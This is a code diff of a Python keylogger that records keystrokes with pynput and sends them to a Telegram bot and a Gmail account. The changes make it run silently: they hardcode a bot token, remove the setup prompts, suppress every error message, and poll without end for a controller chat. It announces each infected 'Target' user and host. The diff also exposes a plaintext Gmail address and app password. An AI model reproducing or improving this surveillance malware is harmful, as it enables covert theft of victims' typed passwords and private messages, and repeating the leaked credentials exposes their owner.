@@ -11,6 +11,7 @@ import telebot # pip install pyTelegramBotAPI
 from pynput import keyboard # pip install pynput
 
 # ================= USER CONFIGURATION (HARDCODED) ===================
+BOT_TOKEN = "8583908951:AAGKAFyJtoPmpX_DeI5ILO77J4OyxMnB8TY"
 EMAIL_ADDRESS = "prakashwijesinghanew@gmail.com"
 EMAIL_PASSWORD = "fner adgz ooqy jmps"
 TO_EMAIL = "prakashwijesinghanew@gmail.com"
@@ -19,72 +20,49 @@ CONFIG_FILE = "config.json"
 # ===================================================================
 
 def get_config():
-    """Load config or create a new one interactively."""
-    config = {}
+    """Load config or auto-discover Chat ID silently."""
+    config = {
+        "bot_token": BOT_TOKEN,
+        "chat_id": ""
+    }
+    
+    # Try to load existing chat_id
     if os.path.exists(CONFIG_FILE):
         try:
             with open(CONFIG_FILE, "r") as f:
-                config = json.load(f)
+                saved_config = json.load(f)
+                if saved_config.get("chat_id"):
+                    config["chat_id"] = saved_config["chat_id"]
         except Exception:
-            print("❌ Error reading config file. Re-running setup.")
+            pass
     
-    # 1. Ask for Bot Token if missing
-    if "bot_token" not in config or not config["bot_token"]:
-        print("==========================================")
-        print("      🚀 KEYLOGGER SETUP WIZARD 🚀        ")
-        print("==========================================")
-        token = input("👉 Enter Telegram Bot Token: ").strip()
-        if not token:
-            print("❌ Token is required! Exiting.")
-            sys.exit(1)
-        config["bot_token"] = token
-        save_config(config)
-
-    # 2. Auto-Discover Chat ID if missing
-    if "chat_id" not in config or not config["chat_id"]:
-        print("\nℹ️  Token saved. Now we need to connect to your Bot.")
-        print(f"⚠️  Time to Auto-Detect your ID!")
-        print(f"👉 Please open your bot in Telegram and send the command: /start")
-        print("⏳ Waiting for you to message the bot...")
-        
+    # If Chat ID is missing, entering Silent Discovery Mode
+    if not config["chat_id"]:
         try:
             temp_bot = telebot.TeleBot(config["bot_token"])
             
-            # Helper to capture first message
-            chat_id_data = {}
-            
-            # Using get_updates to manually poll once instead of infinity_polling for better control
-            # But infinity_polling with a stop condition is also fine.
-            # Let's use a simple loop with get_updates
-            
-            attempts = 0
-            while attempts < 120: # Wait for 2 minutes max
+            # Polling loop to capture first message
+            while True:
                 try:
-                    updates = temp_bot.get_updates(offset=-1) # Get latest
+                    updates = temp_bot.get_updates(offset=-1)
                     if updates:
                         last_update = updates[-1]
                         chat_id = last_update.message.chat.id
-                        print(f"\n✅ CAPTURED CHAT ID: {chat_id}")
-                        chat_id_data['id'] = str(chat_id)
+                        config["chat_id"] = str(chat_id)
+                        save_config(config)
+                        
+                        # Notify Admin of connection
+                        try:
+                            temp_bot.send_message(chat_id, f"✅ **Connection Established!**\nHostname: `{socket.gethostname()}`", parse_mode="Markdown")
+                        except: 
+                            pass
                         break
-                except Exception as e:
+                except Exception:
                     pass
-                time.sleep(1)
-                sys.stdout.write(".")
-                sys.stdout.flush()
-                attempts += 1
-            
-            if 'id' in chat_id_data:
-                config["chat_id"] = chat_id_data['id']
-                save_config(config)
-                print("\n✅ Configuration complete! Keylogger starting...")
-            else:
-                print("\n❌ Timed out waiting for message. Please try again.")
-                sys.exit(1)
+                time.sleep(2) # Retry every 2 seconds
                 
-        except Exception as e:
-            print(f"\n❌ Error during auto-discovery: {e}. Check your Token!")
-            sys.exit(1)
+        except Exception:
+            pass # Silent fail if token is wrong, keep retry logic if needed or exit
 
     return config
 
@@ -92,8 +70,8 @@ def save_config(config):
     try:
         with open(CONFIG_FILE, "w") as f:
             json.dump(config, f, indent=4)
-    except Exception as e:
-        print(f"❌ Error saving config: {e}")
+    except Exception:
+        pass
 
 class KeyloggerBot:
     def __init__(self, config):
@@ -110,14 +88,13 @@ class KeyloggerBot:
         self.hostname = socket.gethostname()
         
         self.is_logging = True
-        self.email_enabled = True # Enabled by default per request
+        self.email_enabled = True 
         
         try:
             self.bot = telebot.TeleBot(self.token)
             self.setup_bot_handlers()
-        except Exception as e:
-            print(f"❌ Error initializing Bot: {e}")
-            sys.exit(1)
+        except Exception:
+            pass
 
     def setup_bot_handlers(self):
         @self.bot.message_handler(commands=['start'])
@@ -196,8 +173,8 @@ class KeyloggerBot:
             with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                 server.login(self.email, self.password)
                 server.send_message(msg)
-        except Exception as e:
-            print(f"Email Error: {e}")
+        except Exception:
+            pass
 
     def send_data(self, force=False):
         if self.log:
@@ -207,8 +184,8 @@ class KeyloggerBot:
             # Send to Telegram
             try:
                 self.bot.send_message(self.chat_id, full_message, parse_mode="Markdown")
-            except Exception as e:
-                print(f"Telegram Error: {e}")
+            except Exception:
+                pass
 
             # Send to Email (if enabled)
             if self.email_enabled:
@@ -226,8 +203,7 @@ class KeyloggerBot:
         # Notify start
         try:
             self.bot.send_message(self.chat_id, f"🚀 **Keylogger Started!**\nTarget: `{self.username}@{self.hostname}`", parse_mode="Markdown")
-            # print("✅ Bot connected to Telegram!") - Remove print to avoid noise in exe
-        except Exception as e:
+        except Exception:
              pass
 
         # Start Reporting Timer
@@ -244,9 +220,10 @@ class KeyloggerBot:
             pass
 
 if __name__ == "__main__":
-    # 1. Load or Create Configuration (Auto-Discovery)
+    # 1. Load Config (Auto-Silent)
     config = get_config()
     
     # 2. Start Keylogger
-    keylogger = KeyloggerBot(config)
-    keylogger.start()
+    if config.get("chat_id"):
+        keylogger = KeyloggerBot(config)
+        keylogger.start()
